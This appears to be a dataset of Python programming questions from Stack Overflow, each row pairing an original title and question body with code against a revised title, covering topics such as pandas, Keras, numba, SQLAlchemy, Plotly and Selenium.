Why __getitem__ and __setitem__ are not called on [:]," I am working on Python 2.7 and I am trying to overload __getitem__ and __setitem__ from a class that inherits list. Let's say I have this class A: With square brackets, A.__getitem__ or A.__setitem__ should be called. Normally it is like that, but when I use [:] the parent implementation is called instead. Why? And why does [::] work? And the same with __setitem__: <code>  class A(list): def __getitem__(self, key): print ""GET!"" def __setitem__(self, key, value): print ""SET!"" a = A([1])a[1] # prints GET!a[""1""] # prints GET!a[::] # prints GET!a[slice(None)] # prints GET!a[:] # returns the list [1] a[1] = 2 # prints SET!a[::] = 2 # prints SET!a[slice(None)] = 2 # prints SET!a[:] = [2] # changes the list ",Why are my subclass's __getitem__ and __setitem__ not called when I use [:]?
Why are __getitem__ and __setitem__ not called on [:]," I am working on Python 2.7 and I am trying to overload __getitem__ and __setitem__ from a class that inherits list. Let's say I have this class A: With square brackets, A.__getitem__ or A.__setitem__ should be called. Normally it is like that, but when I use [:] the parent implementation is called instead. Why? And why does [::] work? And the same with __setitem__: <code>  class A(list): def __getitem__(self, key): print ""GET!"" def __setitem__(self, key, value): print ""SET!"" a = A([1])a[1] # prints GET!a[""1""] # prints GET!a[::] # prints GET!a[slice(None)] # prints GET!a[:] # returns the list [1] a[1] = 2 # prints SET!a[::] = 2 # prints SET!a[slice(None)] = 2 # prints SET!a[:] = [2] # changes the list ",Why are my subclass's __getitem__ and __setitem__ not called when I use [:]?
How to inherit and extend class attributes in Python," I've made a lot of research on the net but I didn't find the correct way to extend ""class"" attributes dictionary with new values in a subclass. Most of the documentation are extending attributes inside methods.I tried dictionary.update() but it doesn't work.This is my example: And I extended it to: If I override dictionary - it works fine. But If I try to extend, it gives me:AttributeError: 'Subclass' object has no attribute 'dictionary' <code>  class Super(object): dictionary = {'one':1, 'two':2} def __init__(self, var): self.var = var def supermethod(self): pass class Subclass(Super): dictionary.update({""zero"":0}) def __init__(self, var): super(Subclass, self).__init__(var) self.var = var def submethod(self): pass",How to inherit and extend class attributes in Python?
Python flatten multilevel JSON," I am trying to convert JSON to CSV file, that I can use for further analysis. Issue with my structure is that I have quite some nested dict/lists when I convert my JSON file.I tried to use pandas json_normalize(), but it only flattens first level. Any idea how to flatter whole JSON file, so I can create single line input to CSV file for single (in this case virtual machine) entry? I have tried couple of solutions posted here, but my result was always only first level was flattened.This is sample JSON (in this case, I still get ""securitygroup"" and ""nic"" output as JSON format: <code>  import jsonimport pandas as pdfrom pandas.io.json import json_normalizefrom cs import CloudStackapi_key = xxxxsecret = xxxxendpoint = xxxxcs = CloudStack(endpoint=endpoint, key=api_key, secret=secret)virtual_machines = cs.virtMach()test = json_normalize(virtual_machines[""virtualmachine""])test.to_csv(""test.csv"", sep=""|"", index=False) { ""count"": 13, ""virtualmachine"": [ { ""id"": ""1082e2ed-ff66-40b1-a41b-26061afd4a0b"", ""name"": ""test-2"", ""displayname"": ""test-2"", ""securitygroup"": [ { ""id"": ""9e649fbc-3e64-4395-9629-5e1215b34e58"", ""name"": ""test"", ""tags"": [] } ], ""nic"": [ { ""id"": ""79568b14-b377-4d4f-b024-87dc22492b8e"", ""networkid"": ""05c0e278-7ab4-4a6d-aa9c-3158620b6471"" }, { ""id"": ""3d7f2818-1f19-46e7-aa98-956526c5b1ad"", ""networkid"": ""b4648cfd-0795-43fc-9e50-6ee9ddefc5bd"" ""traffictype"": ""Guest"" } ], ""hypervisor"": ""KVM"", ""affinitygroup"": [], ""isdynamicallyscalable"": false } ]}",How to flatten multilevel/nested JSON?
Python flatten multilevel/nested JSON," I am trying to convert JSON to CSV file, that I can use for further analysis. Issue with my structure is that I have quite some nested dict/lists when I convert my JSON file.I tried to use pandas json_normalize(), but it only flattens first level. Any idea how to flatter whole JSON file, so I can create single line input to CSV file for single (in this case virtual machine) entry? I have tried couple of solutions posted here, but my result was always only first level was flattened.This is sample JSON (in this case, I still get ""securitygroup"" and ""nic"" output as JSON format: <code>  import jsonimport pandas as pdfrom pandas.io.json import json_normalizefrom cs import CloudStackapi_key = xxxxsecret = xxxxendpoint = xxxxcs = CloudStack(endpoint=endpoint, key=api_key, secret=secret)virtual_machines = cs.virtMach()test = json_normalize(virtual_machines[""virtualmachine""])test.to_csv(""test.csv"", sep=""|"", index=False) { ""count"": 13, ""virtualmachine"": [ { ""id"": ""1082e2ed-ff66-40b1-a41b-26061afd4a0b"", ""name"": ""test-2"", ""displayname"": ""test-2"", ""securitygroup"": [ { ""id"": ""9e649fbc-3e64-4395-9629-5e1215b34e58"", ""name"": ""test"", ""tags"": [] } ], ""nic"": [ { ""id"": ""79568b14-b377-4d4f-b024-87dc22492b8e"", ""networkid"": ""05c0e278-7ab4-4a6d-aa9c-3158620b6471"" }, { ""id"": ""3d7f2818-1f19-46e7-aa98-956526c5b1ad"", ""networkid"": ""b4648cfd-0795-43fc-9e50-6ee9ddefc5bd"" ""traffictype"": ""Guest"" } ], ""hypervisor"": ""KVM"", ""affinitygroup"": [], ""isdynamicallyscalable"": false } ]}",How to flatten multilevel/nested JSON?
What is the `n` parameter of `tkinter.mainloop` function?," A n parameter may be given to tkinter.mainloop function, I was not able to find any documentation about itWhat is the purpose of this n parameter?  <code>  help(tkinter.Tk.mainloop)>>>> mainloop(self, n=0) # What is n here ? Call the mainloop of Tk.",What is the n parameter of tkinter.mainloop function?
Inconcistent behavior of jitted function," I have a very simple function like this one: To which I pass I expected that function will modify data z column in place like this: This works fine most of the time, but somehow fails to modify data in others.I double checked things and:I haven't determined any problems with data points which could cause this problem.I see that data is modified as expected when I print the result.If I return z array from the function it is modified as expected.Unfortunately I couldn't reduce the problem to a minimal reproducible case. For example removing unrelated columns seems to ""fix"" the problem making reduction impossible. Do I use jit in a way that is not intended to be used? Are there any border cases I should be aware of? Or is it likely to be a bug?Edit:I found the source of the problem. It occurs when data contains duplicated column names: If duplicate is removed the function works like expected: <code>  import numpy as npfrom numba import jitimport pandas as pd@jitdef f_(n, x, y, z): for i in range(n): z[i] = x[i] * y[i] f_(df.shape[0], df[""x""].values, df[""y""].values, df[""z""].values) df = pd.DataFrame({""x"": [1, 2, 3], ""y"": [3, 4, 5], ""z"": np.NaN}) >>> f_(df.shape[0], df[""x""].values, df[""y""].values, df[""z""].values)>>> df x y z0 1 3 3.01 2 4 8.02 3 5 15.0 >>> df_ = pd.read_json('{""schema"": {""fields"":[{""name"":""index"",""type"":""integer""},{""name"":""v"",""type"":""integer""},{""name"":""y"",""type"":""integer""},... {""name"":""v"",""type"":""integer""},{""name"":""x"",""type"":""integer""},{""name"":""z"",""type"":""number""}],""primaryKey"":[""index""],""pandas_version"":""0.20.... 0""}, ""data"": [{""index"":0,""v"":0,""y"":3,""v"":0,""x"":1,""z"":null}]}', orient=""table"")>>> f_(df_.shape[0], df_[""x""].values, df_[""y""].values, df_[""z""].values)>>> df_ v y v x z0 0 3 0 1 NaN >>> df_.drop(""v"", axis=""columns"", inplace=True)>>> f_(df_.shape[0], df_[""x""].values, df_[""y""].values, df_[""z""].values)>>> df_ y x z0 3 1 3.0",Inconsistent behavior of jitted function
Cross-platform support for `package_data` with `setup.py` + `pip`," What would be a cross-platform way of shipping data_files with setup.py (compatible with pip)?From the official documentation, one needs to write: and 'bitmaps', etc. are the sub-directories where those files should go (relative to sys.prefix).However, this is sub-optimal for cross-platform installations where the standard sub-dir will depend on the system.Additionally, installing the package in developer mode will not place the files where they will later be after the installation, making this process of finding/using resources ultimately hard / annoying to debug.I have looked into appdirs, but it seems difficult to make it work properly during installation, e.g. if using the user directory for data this gets actually tied to my development environment.The reason I am asking this is because I have a small Python package that implements a simple GUI and I would like to ship an icon with it.For the record, I am OK with processing setup.py with setuptools. <code>  setup(..., data_files=[('bitmaps', ['bm/b1.gif', 'bm/b2.gif']), ('config', ['cfg/data.cfg']), ('/etc/init.d', ['init-script'])] )",Cross-platform support for `data_files` with `setup.py` + `pip`
Removing duplicate content from a list of lists while not preserving any order.," I was writing a code in python to find factor pairs for an integer. But making pairs resulted in reverse pairs as well. I want to eliminate those reverse pairs using a simple method without importing any modules.for eg.[[1, 200], [2, 100], [4, 50], [5, 40], [8, 25], [10, 20], [20, 10], [25, 8], [40, 5], [50, 4], [100, 2], [200, 1]]the output should be: This is what I've got so far: <code>  [[1, 200], [2, 100], [4, 50], [5, 40], [8, 25], [10, 20]] N = []J = []F = []Z = []S = []num = input(""Enter no. of elements in list"")print ('Enter numbers')prod = 1for i in range(int(num)): n = input(""num :"") N.append(int(n))for x in N: prod = prod*xprint (prod)k = input(""Enter no. of splits:"")for o in range(1,prod+1): if prod%o == 0: J.append(o) F.append(o)print (J)Z = [[a, b] for a in J for b in F if a*b == prod]print (Z)",Removing duplicate content from a list of lists while not preserving any order
Prevented from running a script that's triggered by a status bar app hotkey," I'm writing a python app, whose main purpose is to run a minigame (using the 'pygame' library), whenever I use a hotkey (which currently uses the 'keyboard' library). I want this hotkey to be recognized universally, so I'm packaging the whole thing as a status bar app (using the 'rumps' library).So far, I can start the whole thing, select Play from the status bar dropdown, and it works! Great.HOWEVER, if I attempt to use the bound hotkey, to run the same function that Play triggers, I get: This shows up four times, and is followed up To check that it wasn't the hotkey itself, I did a test: If I connect the hotkey to a simpler function, like setting an alert, it works fine. It still complains, and gives me the error: but it does RUN. However if it connects to the Play function, it breaks (and produces the first error, above).To summarize:1) Dropdown => run minigame: Success!2) Hotkey => run minigame: Incomprehensible errors!I've googled this error, but have only seen explanations that are way over my head; is there a way that I could get around this error, by using different software, or a different approach -- but without having to leave python, or performing some deep and evil hack to an underlying system?Could I get the hotkey/game to USE the Main Thread environment, somehow? How?Could I use a vehicle other than a status bar app to listen for the hotkey? (Update: I tried pynput, and got the same non-main thread error.)Could I do something inside of pygame to not make it as offensive? (At the moment, it's literally just animating a rolling sine wave.)Could I get the rumps callback function to work? At the moment, it's just not doing ANYTHING, no matter where or how it's called.(And unfortunately, this on a Mac, because pyhk3 is for windows only, and wx.Window (which can have hotkeys) is also for windows only)FURTHER failure: Can't get it to run with Keyboard Maestro either -- I've never used it before, so may well be using it wrong, but it also seems like a VERY simple command, that just flat-out has no response whatsoever.Aaand ... the Automator script runs, but -- not with the hotkey! (EDIT: The hotkey was apparently taken. But a different one worked! See below.) <code>  python[58226:599749] pid(58226)/euid(0) is calling TIS/TSM in non-main threadenvironment, ERROR : This is NOT allowed. Please call TIS/TSM in main thread!!! python[58226:599749] WARNING: nextEventMatchingMask should only becalled from the Main Thread! This will throw an exception in the future. python[60308:620099] -[NSAlert runModal] may only be invoked from the main thread. Behavior on other threads is undefined. (0 AppKit 0x00007fff2b7f563f -[NSAlert runModal] + 1781 _objc.cpython-36m-darwin.so 0x000000010c1358c7 ffi_call_unix64 + 792 ??? 0x000070000f3b2e50 0x0 + 123145557847632)","TIS/TSM non-main thread error; pygame script triggered by hotkey (rumps, pygame, keyboard)"
Python - How to report an exception for later," I have a python file in which i have two functions that each of them raise an exception. My question, is it possible to store these exceptions in a variable, like list for example--[e1, e2]--, in order to control the order of exceptions execution in another function, say h ? <code>  def f(): raise e1def g(): raise e2",How to report an exception for later
Converting an image from Cartisian to Polar - Limb Darkening," The solar disc I'm using:I'm wondering if there is an easy way to convert the image from cartesian to polar? Like this example:Or like this example:For some reason, I've found many examples in MATLAB but I've yet to find one in Python. I've been looking at this from opencv but I'm not entirely sure it's what I want, as I want to keep the original image/array size. I know converting to polar will 'screw' up the image but that is fine, the main thing I'm wanting to do is measure the intensity of the solar disk from the center out to the edge, plotting a function of intensity vs radius so I can measure limb darkening. <code>  import numpy as npimport cv2from matplotlib import pyplot as pltimg = cv2.imread('C:\\Users\\not my user name\\Desktop\\20140505_124500_4096_HMIIC.jpg', 0)norm_image = cv2.normalize(img, dst=None, norm_type=cv2.NORM_MINMAX, dtype=cv2.CV_32F)plt.imshow(norm_image, cmap='afmhot', interpolation='bicubic')plt.xticks([]), plt.yticks([])plt.show()",Converting an image from Cartesian to Polar - Limb Darkening
Pytesseract unable to detect characters in image," Obviously this image is pretty tough as it is low clarity and is not a real word. However, with this code, I'm detecting nothing close: outputs Any ideas here? The image my contrasting function produces is:Which looks decent? I don't have a ton of OCR experience. What preprocessing would you recommend here? I've tried resizing the image larger, which helps a little bit but not enough, along with a bunch of different filters from PIL. Nothing getting particularly close though <code>  import pytesseractfrom PIL import Image, ImageEnhance, ImageFilterimage_name = 'NedNoodleArms.jpg'im = Image.open(image_name) im = im.filter(ImageFilter.MedianFilter())enhancer = ImageEnhance.Contrast(im)im = enhancer.enhance(2)im = im.convert('1')im.save(image_name)text = pytesseract.image_to_string(Image.open(image_name))print(text) , Mdaodamms",Image Preprocessing for OCR - Tessaract
built-in module to calculate least common multiple," I am currently using a function that accepts two numbers and uses a loop to find the least common multiple of those numbers, Is there a built-in module in Python that does it instead of writing a custom function? <code>  def lcm(x, y): """"""This function takes two integers and returns the L.C.M."""""" # Choose the greater number if x > y: greater = x else: greater = y while(True): if((greater % x == 0) and (greater % y == 0)): lcm = greater break greater += 1 return lcm",Built-in module to calculate the least common multiple
Keras categorical_accuracy metric and padded/masked values," If I look into keras metric I see that the values of y_true and y_predict are ""just"" compared at the end of each epoch for categorical_accuracy: How are masked values handled? If I understood correctly, masking prohibits the masked values to influence the training, but it still produces predictions for the masked values. Thereby, it does, in my opinion, influence the metric. More explanation on how it influences the metric: In the padding/masking process, I set the padded/masked values in y_true to an unused class e.g. class 0.If now argmax() is looking for a max value in the one-hot encoded y_true, it will just return 0 as the total (masked) row is the same.I do not have a class 0, as it is my masking value/class, and thereby the y_pred and y_true certainly have different values creating a reduced accuracy. Is this somehow already thought of in the Keras metric and I oversaw it? Otherwise, I would have to create a custom metric or callback creating a similar metric to categorical_accuracy with the addition that all masked values are eliminated in y_pred and y_true before comparison.  <code>  def categorical_accuracy(y_true, y_pred): return K.cast(K.equal(K.argmax(y_true, axis=-1), K.argmax(y_pred, axis=-1)), K.floatx())",How do masked values affect the metrics in Keras?
"How do I sum a column by ID, but skip the first instance? (Pandas)"," I have a dataframe like the following. I would essentially like to do an operation like df.groupby('ID').sum() to get the sum of the Variable column, but I need to skip the first period observed for a particular ID. So, for ID=1, I am dropping the observation at period 1, but for ID=2, I am dropping the observation at period 2. How can I do this?  <code>  A = [{'ID':1, 'Period':1, 'Variable':21}, {'ID':1,'Period':2, 'Variable':12}, {'ID':2, 'Period':2, 'Variable':14}, {'ID':2, 'Period':3, 'Variable':18}]df = pd.DataFrame(A)","Sum a column by ID, but skip the first instance?"
Plotting two histograms from a pandas DataFrame in one subplot using matplotlib and python 3," I have a pandas dataframe like the following: and I want to create histograms of this data with every dataframe header in one subplot. For that the previous code works perfectly but now I want to combine eyery a and b header (e.g. ""a_woods"" and ""b-woods"") to one subplot so there would be just three histograms. I tried assigning two columns to df.columns[[m,m+3]] but this doesn't work. I also have an index column with strings like ""day_1"", which I want to be on the x-axis. Can someone help me?This is how far i got. <code>  df = pd.DataFrame({ 'a_wood' : np.random.randn(100), 'a_grassland' : np.random.randn(100), 'a_settlement' : np.random.randn(100), 'b_wood' : np.random.randn(100), 'b_grassland' : np.random.randn(100), 'b_settlement' : np.random.randn(100)}) fig, ax = plt.subplots(2, 3, sharex='col', sharey='row')m=0for i in range(2): for j in range(3): df.hist(column = df.columns[m], bins = 12, ax=ax[i,j], figsize=(20, 18)) m+=1",Plotting two histograms from a pandas DataFrame in one subplot using matplotlib
pycharm running python file always opens a new console," I initially started learning Python in Spyder, but decided to switch to PyCharm recently, hence I'm learning PyCharm with a Spyder-like mentality. I'm interested in running a file in the Python console, but every time I rerun this file, it will run under a newly opened Python console. This can become annoying after a while, as there will be multiple Python consoles open which basically all do the same thing but with slight variations. I would prefer to just have one single Python console and run an entire file within that single console. Would anybody know how to change this? Perhaps the mindset I'm using isn't very PyCharmic? <code> ",PyCharm running Python file always opens a new console
How to load a model saved in joblib file from Google cloud storage bucket," I want to load a model which is saved as a joblib file from Google Cloud Storage bucket. When it is in local path, we can load it as follows (considering model_file is the full path in system): How can we do the same task with Google Cloud Storage? <code>  loaded_model = joblib.load(model_file)",How to load a model saved in joblib file from Google Cloud Storage bucket
pandas group by aggregate element wise list addition," I have a pandas dataframe that looks as follows: I want to perform an aggregate groupby that adds the lists stored in the Y columns element-wise. Code I have tried: The result is the following: So it has concatenated the lists and not sum them element-wise. The expected result however is: I have tried different methods, but could not get this to work as expected. <code>  X Y71455 [334.0, 319.0, 298.0, 323.0]71455 [3.0, 8.0, 13.0, 10.0]57674 [54.0, 114.0, 124.0, 103.0] df.groupby('X').agg({'Y' : sum}) YX 71455 [334.0, 319.0, 298.0, 323.0, 75.0, 55.0, ... X Y71455 [337.0, 327.0, 311.0, 333.0]57674 [54.0, 114.0, 124.0, 103.0]",pandas groupby aggregate element-wise list addition
How to determine the class predicted by a convolutional neural network on Keras?," I'm building a CNN to perform sentiment analysis on Keras.Everything is working perfectly, the model is trained and ready to be launched to production.However, when I try to predict on new unlabelled data by using the method model.predict() it only outputs the associated probability. I tried to use the method np.argmax() but it always outputs 0 even when it should be 1 (on test set, my model achieved 80% of accuracy). Here is my code to pre-process the data: And here is my model: I also tried to change the number of activations on the final Dense layer from 1 to 2, but I get an error:  <code>  # Pre-processing datax = df[df.Sentiment != 3].Headlinesy = df[df.Sentiment != 3].Sentiment# Splitting training, validation, testing datasetx_train, x_validation_and_test, y_train, y_validation_and_test = train_test_split(x, y, test_size=.3, random_state=SEED)x_validation, x_test, y_validation, y_test = train_test_split(x_validation_and_test, y_validation_and_test, test_size=.5, random_state=SEED)tokenizer = Tokenizer(num_words=NUM_WORDS)tokenizer.fit_on_texts(x_train)sequences = tokenizer.texts_to_sequences(x_train)x_train_seq = pad_sequences(sequences, maxlen=MAXLEN)sequences_val = tokenizer.texts_to_sequences(x_validation)x_val_seq = pad_sequences(sequences_val, maxlen=MAXLEN)sequences_test = tokenizer.texts_to_sequences(x_test)x_test_seq = pad_sequences(sequences_test, maxlen=MAXLEN) MAXLEN = 25NUM_WORDS = 5000VECTOR_DIMENSION = 100tweet_input = Input(shape=(MAXLEN,), dtype='int32')tweet_encoder = Embedding(NUM_WORDS, VECTOR_DIMENSION, input_length=MAXLEN)(tweet_input)# Combinating n-gram to optimize resultsbigram_branch = Conv1D(filters=100, kernel_size=2, padding='valid', activation=""relu"", strides=1)(tweet_encoder)bigram_branch = GlobalMaxPooling1D()(bigram_branch)trigram_branch = Conv1D(filters=100, kernel_size=3, padding='valid', activation=""relu"", strides=1)(tweet_encoder)trigram_branch = GlobalMaxPooling1D()(trigram_branch)fourgram_branch = Conv1D(filters=100, kernel_size=4, padding='valid', activation=""relu"", strides=1)(tweet_encoder)fourgram_branch = GlobalMaxPooling1D()(fourgram_branch)merged = concatenate([bigram_branch, trigram_branch, fourgram_branch], axis=1)merged = Dense(256, activation=""relu"")(merged)merged = Dropout(0.25)(merged)output = Dense(1, activation=""sigmoid"")(merged)optimizer = optimizers.adam(0.01)model = Model(inputs=[tweet_input], outputs=[output])model.compile(loss=""binary_crossentropy"", optimizer=optimizer, metrics=['accuracy'])model.summary()# Training the modelhistory = model.fit(x_train_seq, y_train, batch_size=32, epochs=5, validation_data=(x_val_seq, y_validation)) Error when checking target: expected dense_12 to have shape (2,) but got array with shape (1,)",How do I determine the binary class predicted by a convolutional neural network on Keras?
Best way to find longest list in list?," Given a list of lists, the length of the longest list can be found with the following code. How can the length of the longest list, or the longest list be found, without a loop. <code>  values = [['a','a'], ['a','b','b'], ['a','b','b','a'], ['a','b','c','a']]longest = 0for value in values: longest = max(longest, len(value))print(longest)[out]: 4",How to find the longest list in a list?
Best way to find longest sublist in list?," Given a list of lists, the length of the longest list can be found with the following code. How can the length of the longest list, or the longest list be found, without a loop. <code>  values = [['a','a'], ['a','b','b'], ['a','b','b','a'], ['a','b','c','a']]longest = 0for value in values: longest = max(longest, len(value))print(longest)[out]: 4",How to find the longest list in a list?
Best way to find the longest list in a list?," Given a list of lists, the length of the longest list can be found with the following code. How can the length of the longest list, or the longest list be found, without a loop. <code>  values = [['a','a'], ['a','b','b'], ['a','b','b','a'], ['a','b','c','a']]longest = 0for value in values: longest = max(longest, len(value))print(longest)[out]: 4",How to find the longest list in a list?
"python fourier filtering, going back to an image"," I have a repeating fringe pattern on my data and I am trying to get it out by Fourier transforming it and deleting the pattern. However I can't seem to find the correct way back to image space. taper is just an array that smooths the edges to get rid of the edge effects while doing an FFT. Then I FFT the array and filter out the gunk very roughly. However going back does not seem to work. Am I tripping up somewhere?  <code>  red_cube_array = (cube_array - np.median(cube_array)) * taperim_fft = (fftpack.fft2(red_cube_array))im_po = fftpack.fftshift((np.conjugate(im_fft) * im_fft).real)mask = np.empty_like(im_po[0])*0 + 1mask[417:430, 410:421] = 0mask[430:443, 438:450] = 0im_po_mask = im_po * maskim_ifft = fftpack.ifft2(fftpack.ifftshift(im_po_mask))","Fourier filtering, going back to an image"
Understanding sigmoid_cross_entropy loss function from tensorflow for image segmentation," I'm trying to understand what the sigmoid_cross_entropy loss function does with regards to image segmentation neural networks:Here is the relevant Tensorflow source code: My main question is why is there a math_ops.add() at the return? Is the add referring to the summation of the loss for every pixel in the image or is the summation doing something different? I'm not able to properly follow the dimensional changes to deduce what the summation is doing.  <code>  zeros = array_ops.zeros_like(logits, dtype=logits.dtype)cond = (logits >= zeros)relu_logits = array_ops.where(cond, logits, zeros)neg_abs_logits = array_ops.where(cond, -logits, logits)return math_ops.add( relu_logits - logits * labels, math_ops.log1p(math_ops.exp(neg_abs_logits)), name=name)",sigmoid_cross_entropy loss function from tensorflow for image segmentation
Python SQLAlchemy want to create table with specific columns and values using a cte statement," I am trying to implement a PostgreSQL query in Python, using SQLAlchemy, but to no avail. My query is the following: I tried many different approaches, but the main issue was that I could not create the ""given"" table with a CTE statement, being able to predefine the column names and give the required values.This is a helpful thread on the VALUES clause in SQLAlchemy, but I still haven't managed to work the problem out. Any insight on this issue would be more than welcome! <code>  with given (""id"", ""instance"") as ( values (1, 1), (108, 23), (203, 5))select given.""id"" from givenleft join panel on panel.""id"" = given.""id"" and panel.instance_id = given.""instance""where panel.""id"" is null",Create a table value with specific columns and values using a CTE statement
how to connect_to_region in boto3, How can one achieve the boto command: using the boto3 suite?It seems not to be at a glance in the docs I guess it's a simpler and more precise question than the extense answer you can find in the following post. Thanks for any help <code>  boto.ec2.connect_to_region(),how to connect to region in boto3
How to use python io to generate in memory data streams as file like objects?," I like to generate a in-memory (temp file) data stream in Python. One thread is filling the stream with data, and a other one consumes it.After checking the io - Core tools for working with streams , it seems to me that the io module is the best choice for it.So I put a simple example for me: My example does not work. ""hello"" is not written to a and can not be read after. So were is my error? How do I have to alter my code to get a file like object in memory? <code>  #!/usr/local/bin/python3# encoding: utf-8import ioif __name__ == '__main__': a = io.BytesIO() a.write(""hello"".encode()) txt = a.read(100) txt = txt.decode(""utf-8"") print(txt) ",How to use io to generate in memory data streams as file like objects?
Plotly Histogram: Bin all outliers into one bin," So the question is:Can I plot a histogram in Plotly, where all values that are bigger than some threshold will be grouped into one bin?The desired output:But using standard plotly Histogram class I was able only to get this output:  <code>  import pandas as pdfrom plotly import graph_objs as gofrom plotly.offline import init_notebook_mode, iplotinit_notebook_mode()test_df = pd.DataFrame({'values': [1]*10 + [2]*9 + [3.1]*4 + [3.6]*4 + [4]*7 + [5]*6 + [6]*5 + [7]*4 + [8]*3 + [9]*2 + [10]*1 + [111.2]*2 + [222.3]*2 + [333.4]*1}) # <- I want to group them into one bin ""> 10""data = [go.Histogram(x=test_df['values'], xbins=dict( start=0, end=11, size=1 ), autobinx = False)]layout = go.Layout( title='values')fig = go.Figure(data=data, layout=layout)iplot(fig, filename='basic histogram')",How to bin all outliers into one bin using Histogram in Plotly?
Remove all rows that meet regex condition.," trying to teach myself pandas.. and playing around with different dtypesI have a df as follows the dtype of ID is of course an object. What I want to do is remove any rows in the DF if the ID has a string in it.I thought this would be as simple as.. but this returns everything, is there a sure fire method for dealing with such things?  <code>  df = pd.DataFrame({'ID':[0,2,""bike"",""cake""], 'Course':['Test','Math','Store','History'] })print(df) ID Course0 0 Test1 2 Math2 bike Store3 cake History df.ID.filter(regex='[\w]*')",Remove all rows that meet regex condition
Keras + Tensorflow - quantize a neural network model," Recently, I've started creating neural networks with Tensorflow + Keras and I would like to try the quantization feature available in Tensorflow. So far, experimenting with examples from TF tutorials worked just fine and I have this basic working example (from https://www.tensorflow.org/tutorials/keras/basic_classification): Now, I would like to employ quantization in the learning and classification process. The quantization documentation (https://www.tensorflow.org/performance/quantization) (the page is no longer available since cca September 15, 2018) suggests to use this piece of code: However, it does not contain any information about where this code should be utilized or how it should be connected to a TF code (not even mentioning a high level model created with Keras). I have no idea how this quantization part relates to the previously created neural network model. Just inserting it following the neural network code runs into the following error: Is it possible to quantize a Keras NN model in this way or am I missing something basic?A possible solution that crossed my mind could be using low level TF API instead of Keras (needing to do quite a bit of work to construct the model), or maybe trying to extract some of the lower level methods from the Keras models. <code>  import tensorflow as tffrom tensorflow import kerasfashion_mnist = keras.datasets.fashion_mnist(train_images, train_labels), (test_images, test_labels) = fashion_mnist.load_data()# fashion mnist data labels (indexes related to their respective labelling in the data set)class_names = ['T-shirt/top', 'Trouser', 'Pullover', 'Dress', 'Coat', 'Sandal', 'Shirt', 'Sneaker', 'Bag', 'Ankle boot']# preprocess the train and test imagestrain_images = train_images / 255.0test_images = test_images / 255.0# settings variablesinput_shape = (train_images.shape[1], train_images.shape[2])# create the model layersmodel = keras.Sequential([keras.layers.Flatten(input_shape=input_shape),keras.layers.Dense(128, activation=tf.nn.relu),keras.layers.Dense(10, activation=tf.nn.softmax)])# compile the model with added settingsmodel.compile(optimizer=tf.train.AdamOptimizer(), loss='sparse_categorical_crossentropy', metrics=['accuracy'])# train the modelepochs = 3model.fit(train_images, train_labels, epochs=epochs)# evaluate the accuracy of model on test datatest_loss, test_acc = model.evaluate(test_images, test_labels)print('Test accuracy:', test_acc) loss = tf.losses.get_total_loss()tf.contrib.quantize.create_training_graph(quant_delay=2000000)optimizer = tf.train.GradientDescentOptimizer(0.00001)optimizer.minimize(loss) Traceback (most recent call last): File ""so.py"", line 41, in <module> loss = tf.losses.get_total_loss() File ""/usr/local/lib/python3.5/dist-packages/tensorflow/python/ops/losses/util.py"", line 112, in get_total_loss return math_ops.add_n(losses, name=name) File ""/usr/local/lib/python3.5/dist-packages/tensorflow/python/ops/math_ops.py"", line 2119, in add_n raise ValueError(""inputs must be a list of at least one Tensor with the ""ValueError: inputs must be a list of at least one Tensor with the same dtype and shape",Quantize a Keras neural network model
"Python, selenium. What is arguments in driver.execute_script?"," I'm trying to crawl the pages that I interested in. For this, I need to remove attribute of element from HTML. 'style' is what I want to remove. So I find some codes from Stackoverflow.(i'm using Chrome for driver) What does arguments[0] do in the code? Can anyone explain arguments[0]'s roles concretely? <code>  element = driver.find_element_by_xpath(""//select[@class='m-tcol-c' and @id='searchBy']"")driver.execute_script(""arguments[0].removeAttribute('style')"", element)",What is arguments[0] while invoking execute_script() method through WebDriver instance through Selenium and Python?
Are random seeds comparable between systems?," I made a random forest model using python's sklearn package where I set the seed to for example to 1234. To productionise models, we use pyspark. If I was to pass the same hyperparmeters and same seed value, i.e. 1234, will it get the same results?Basically, do random seed numbers work between different systems? <code> ",Are random seeds compatible between systems?
Reduce Sequential Ranges Of Numbers to Hyphenated Ranges," Today I'm requesting help with a Python script that I'm writing; I'm using the CSV module to parse a large document with about 1,100 rows, and from each row it's pulling a Case_ID, a unique number that no other row has. For example: As you can see, this list is quite an eyeful, so I'd like to include a small little function in my script that can reduce all of the sequential ranges down to hyphenated bookends of a sort, for example 10,277 - 10,282. Thanks to all for any help included! Have a great day. <code>  ['10215', '10216', '10277', '10278', '10279', '10280', '10281', '10282', '10292', '10293','10295', '10296', '10297', '10298', '10299', '10300', '10301', '10302', '10303', '10304','10305', '10306', '10307', '10308', '10309', '10310', '10311', '10312', '10313', '10314','10315', '10316', '10317', '10318', '10319', '10320', '10321', '10322', '10323', '10324','10325', '10326', '10344', '10399', '10400', '10401', '10402', '10403', '10404', '10405','10406', '10415', '10416', '10417', '10418', '10430', '10448', '10492', '10493', '10494','10495', '10574', '10575', '10576', '10577', '10578', '10579', '10580', '10581', '10582','10583', '10584', '10585', '10586', '10587', '10588', '10589', '10590', '10591', '10592','10593', '10594', '10595', '10596', '10597', '10598', '10599', '10600', '10601', '10602','10603', '10604', '10605', '10606', '10607', '10608', '10609', '10610', '10611', '10612','10613', '10614', '10615', '10616', '10617', '10618', '10619', '10620', '10621', '10622','10623', '10624', '10625', '10626', '10627', '10628', '10629', '10630', '10631', '10632','10633', '10634', '10635', '10636', '10637', '10638', '10639', '10640', '10641', '10642','10643', '10644', '10645', '10646', '10647', '10648', '10649', '10650', '10651', '10652','10653', '10654', '10655', '10656', '10657', '10658', '10659', '10707', '10708', '10709','10710', '10792', '10793', '10794', '10795', '10908', '10936', '10937', '10938', '10939','11108', '11109', '11110', '11111', '11112', '11113', '11114', '11115', '11116', '11117','11118', '11119', '11120', '11121', '11122', '11123', '11124', '11125', '11126', '11127','11128', '11129', '11130', '11131', '11132', '11133', '11134', '11135', '11136', '11137','11138', '11139', '11140', '11141', '11142', '11143', '11144', '11145', '11146', '11147','11148', '11149', '11150', '11151', '11152', '11153', '11154', '11155', '11194', '11195','11196', '11197', '11198', '11199', '11200', '11201', '11202', '11203', '11204', '11205','11206', '11207', '11208', '11209', '11210', '11211', '11212', '11213', '11214', '11215','11216', '11217', '11218', '11219', '11220', '11221', '11222', '11223', '11224', '11225','11226', '11227', '11228', '11229', '11230', '11231', '11232', '11233', '11234', '11235','10101', '10102', '10800', '11236']",Collapse sequences of numbers into ranges
